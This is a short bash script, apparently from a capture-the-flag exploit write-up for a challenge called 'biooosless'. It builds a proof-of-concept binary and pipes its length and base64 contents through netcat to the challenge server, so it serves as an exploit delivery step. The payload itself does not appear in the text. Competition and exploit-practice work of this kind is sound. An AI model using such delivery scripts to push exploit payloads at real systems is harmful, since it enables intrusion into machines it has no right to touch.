#!/bin/bash
set -e
./make.sh && printf '%s\n%s\n' $(printf '%x\n' $(wc -c poc.bin | cut -d' ' -f 1 )) $(cat poc.bin | base64 -w0) | timeout 11 stdbuf -o0 -i0 -e0 nc biooosless.challenges.ooo 6543
